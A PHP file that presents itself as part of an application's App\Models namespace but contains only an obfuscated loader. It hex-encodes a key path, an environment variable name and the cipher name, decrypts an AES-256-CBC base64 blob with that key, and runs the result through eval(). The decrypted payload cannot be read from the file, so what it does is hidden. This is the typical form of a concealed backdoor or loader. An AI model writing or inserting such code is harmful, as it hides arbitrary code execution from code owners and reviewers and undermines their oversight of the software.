<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('eqjWI4WGsBIvCddU61WUxg==');

$c=base64_decode(

'VPz3Pc4pXEdiRBrtOuXEA8vzIrx4/0omhSC6sTWTXOivptFYqJRLcbiew2c9qpMU9/qpr2BHYQWu' .
'UjuEzV6hQVxlDV667/OKS5fHEHThpJdNrfLrymQmFoaW+9y3+6lDg7Va3MN4Fls0C0z0n7VSqRoj' .
'pyDowwnDe707p/16vXYBA9jQizsyZ9N1fb0TeFxxLygn0kyl5zRMBxRgn6hEbLGZtnd2oNvBpZV2' .
'9IDImZ/rTy2wgA8ybtDu8qkP9/mzzKzXoItGprbmg9OEBwMNoocIoPlOEss6I/V/O5bRaVzddmpc' .
'6HmJ/r0umnjfPFPpVMSQ2az767433JA2XdLQ6KPic6kwXYrljg3LvmwGzaR1a68SC3i0yBHeVG3b' .
'CvsNiYzJb4I9FuQhjNMlsV54uXhm9U/rt89VJWdDYBWxzpmj6ceN9+qimHoUsCnaMFkCEazFBChr' .
'Rtnk6/xmR7FwyblEAyxebwBcrBb5o1jDsIZtJDe7xC2/iGim/g+oBWIkKjsiR0aHlGwHCTlYc+N1' .
'DPhcD9IdABhwiBYVD54Bg0eF1SJz/MSVvpiwSFVHIAi0ukz4W7p2C6ch3+9XGS6PwmLuvrdgNSNV' .
'NPopy4Uozf2xen/Wxrg2ZYho+aDllRHzj+vtfmzcvHQabKPO6Y04a77VpcTaFBUQqP55BNfl0KCI' .
'xWmggpTm1MPkpUEipeXD4JgRn/UATZIGnBdxxzK2DtOX8XXTJrrvO7BZ7R/7fab/zI041h2JelVh' .
'udsl5qLllLWjt7isDlgdGaJLKvjcCfctJSLx6GMSzWvACoa9Os3hzozi4AI9u/cqsLw3m1Q2drOc' .
'HLxaEcjm5YR7zCqyizAc0V1MXqBwaABcKlZk2eFd8r098AwzvbG81+RLKsCg9BsEIyQ1ADEWnluX' .
'KDRKLK6eOPmXxp1wS+mrQ0KAhGaAsFD5tiMGjF04AmnfxA4K1+v47l+3TKNCHdwspv+xhw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

